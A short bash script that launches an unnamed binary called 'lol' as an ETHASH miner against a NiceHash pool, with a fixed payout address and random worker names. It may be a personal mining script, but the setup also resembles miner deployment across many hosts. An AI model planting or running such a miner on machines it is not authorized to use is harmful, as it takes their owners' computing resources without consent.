#!/bin/bash
POOL=daggerhashimoto.eu-west.nicehash.com:3353
USER=3QS2aoB4SYDAUuxgHRpZTGuYfgz3tdMacH
WORKER=$(echo $(shuf -i 1-5 -n 1)-gass) 
chmod +x lol
./lol --algo ETHASH --pool $POOL --user  $USER.$WORKER -pass x
